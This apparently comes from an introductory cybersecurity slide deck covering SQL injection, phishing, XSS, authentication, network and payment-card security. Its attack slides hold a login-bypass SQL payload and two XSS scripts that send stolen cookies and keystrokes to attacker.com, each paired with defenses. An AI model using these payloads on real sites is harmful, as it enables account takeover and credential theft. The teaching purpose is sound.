What is Cybersecurity?

SQL Injection Explained

  • SQL (Structured Query Language) is the standard language for managing relational databases like MySQL, PostgreSQL, Oracle, and Microsoft SQL Server
  • Databases store all critical application data: user accounts, hashed passwords, credit card information, business records, and confidential documents
  • SQL Injection occurs when attackers insert malicious SQL code fragments into application input fields, forms, URLs, or cookies
  • Exploits poor input validation and dynamic query construction, tricking the database into executing unintended commands with the application's privileges
  • Ranked #3 in OWASP Top 10—one of the oldest and most dangerous vulnerabilities, yet still prevalent in modern applications
SLIDE 05 / 24

SQL Injection Attack

Login Authentication Bypass

Normal Query: SELECT * FROM users WHERE username='john' AND password='pass123'
Attack Input: Username: admin' --
The single quote closes the string, double dash comments out the rest
Resulting Query: SELECT * FROM users WHERE username='admin' --' AND password='x'
Password check is ignored! Attacker logs in as admin without password
SLIDE 06 / 24

SQL Injection Defense

# VULNERABLE - String Concatenation query = "SELECT * FROM users WHERE username='" + user + "'" # SECURE - Prepared Statements (Parameterized Queries) query = "SELECT * FROM users WHERE username=?" cursor.execute(query, (user,))
  • Prepared Statements: Separate SQL code from data—user input bound as parameter, cannot alter SQL syntax
  • Input Validation: Whitelist expected formats, reject suspicious patterns, validate data types
  • Least Privilege: Grant minimal database permissions—read-only when possible
  • ORM Frameworks: SQLAlchemy, Hibernate, Entity Framework handle parameterization automatically
  • Error Handling: Never expose SQL error messages—they reveal database structure

Authentication & Authorization

Authentication

  • Identity verification - proving you are who you claim to be
  • Passwords - weakest method, vulnerable to guessing and leaks
  • Multi-Factor (MFA) - combines multiple verification methods (something you know + have + are)
  • Biometrics - fingerprints, face ID, retina scans
  • Tokens - JWT, OAuth, SAML for stateless authentication
  • Hardware keys - YubiKey, security keys (most secure)

Authorization

  • Access control - what authenticated users can do and access
  • Role-Based (RBAC) - permissions assigned to roles (admin, user, guest)
  • Access Control Lists - per-resource permission definitions
  • Least Privilege - grant minimum necessary permissions
  • Zero Trust - never trust, always verify every access request
  • Attribute-Based - dynamic permissions based on context

Email-Based Threats

Phishing Attacks

  • General Phishing - mass emails impersonating banks, government agencies, or popular services to steal credentials
  • Spear Phishing - targeted attacks on specific individuals using personalized information gathered from social media
  • Whaling - attacks targeting executives and high-value individuals (CEOs, CFOs) with sophisticated social engineering
  • Business Email Compromise (BEC) - impersonating company executives to authorize fraudulent wire transfers

Other Email Threats

  • Malware Distribution - malicious attachments (.exe, .zip, macros in Office docs) that install ransomware, trojans, or keyloggers
  • Email Spoofing - forging sender addresses to appear legitimate, bypassing trust filters
  • Link Manipulation - hiding malicious URLs behind legitimate-looking anchor text or shortened links
  • Credential Harvesting - fake login pages that capture usernames and passwords
SHOCKING REALITY: 90% of successful cyberattacks start with a phishing email. Email is the #1 attack vector because it exploits human psychology rather than technical vulnerabilities—making it consistently effective.
SLIDE 09 / 24

Phishing Detection & Prevention

  • Urgency and pressure: "Act now!" or "Account suspended!" messages bypass critical thinking
  • Suspicious sender addresses: Domain misspellings (amazn.com vs amazon.com), free email for business
  • Generic greetings: "Dear Customer" instead of your name
  • Poor writing quality: Spelling errors, grammar mistakes
  • Unexpected attachments: Unsolicited files (.exe, .zip) or shortened URLs
Protection: Hover over links • Verify sender • Use email filters • Enable MFA • Report suspicious emails

Cross-Site Scripting (XSS)

  • HTML Injection: Inserting unauthorized HTML markup to modify page structure
  • XSS (Cross-Site Scripting): Injects malicious JavaScript executing in victims' browsers
  • Unlike SQL injection (server-side), XSS attacks execute client-side in the browser
  • Can steal cookies, redirect to phishing sites, modify content, capture keystrokes
Three XSS Types: Stored XSS - Script stored on server, served to all users
Reflected XSS - Script in URL reflected back without validation
DOM-based XSS - Client-side JavaScript improperly handles input
SLIDE 11 / 24

XSS Attack Examples

Cookie Theft Attack: <script>fetch('attacker.com/steal?c=' + document.cookie);</script>
Steals session cookies to impersonate victims
Keylogger Attack: <script>document.addEventListener('keypress', e => fetch('attacker.com/log?k=' + e.key));</script>
Records every keystroke including passwords
MySpace Samy worm (2005) infected 1M+ users in 24 hours using XSS

XSS Defense Strategies

// VULNERABLE - Direct HTML Insertion element.innerHTML = userInput; // SECURE - Text Content Only element.textContent = userInput;
  • Output Encoding: Convert dangerous characters to HTML entities—< becomes &lt;, > becomes &gt;
  • Content Security Policy (CSP): HTTP header defining trusted content sources, blocking inline scripts
  • Modern Frameworks: React, Vue, Angular auto-escape output by default
  • HTTPOnly Cookies: Prevents JavaScript from accessing session cookies via document.cookie
  • Input Validation: Reject suspicious patterns, use DOMPurify for HTML sanitization

Network Security

Protection Measures

  • HTTPS/TLS encryption - protects data in transit, prevents eavesdropping
  • VPN - encrypted tunnel for untrusted networks
  • Strong cipher suites - AES-256, ChaCha20
  • Certificate validation - verify SSL/TLS certificates
  • Network segmentation - isolate critical systems

Network Threats

  • MITM - intercepts communication between parties
  • DNS Hijacking - redirects domains to malicious servers
  • Session Hijacking - steals session tokens
  • Packet Sniffing - captures unencrypted traffic
  • Evil Twin WiFi - fake access points
SLIDE 15 / 24

Payment Card Security

  • PCI DSS (Payment Card Industry Data Security Standard): Mandatory security framework with 12 requirements for any organization storing, processing, or transmitting cardholder data
  • Never store prohibited data: CVV/CVC codes (3-4 digit security codes) are explicitly prohibited from storage, full magnetic stripe data, and PIN numbers must never be retained after authorization
  • Tokenization: Replace sensitive card data with non-sensitive equivalents (tokens) that are meaningless to attackers if stolen and can only be used within specific contexts
  • Use payment processors: Services like Stripe, PayPal, Square, and Braintree handle PCI compliance, reducing your scope and liability significantly
  • Encryption requirements: All cardholder data must be encrypted in transit (TLS 1.2+) and at rest using strong cryptography (AES-256) with proper key management
  • 3D Secure authentication: Additional verification layer (Verified by Visa, Mastercard SecureCode) reduces fraud liability by confirming cardholder identity

Core Security Principles

  • Defense in Depth: Multiple security layers ensure protection
  • Least Privilege: Grant minimum necessary permissions
  • Zero Trust: Never trust, always verify every request
  • Fail Secure: Systems should fail to secure state, not open
  • Security by Design: Built-in from start, not bolted on

Key Takeaways
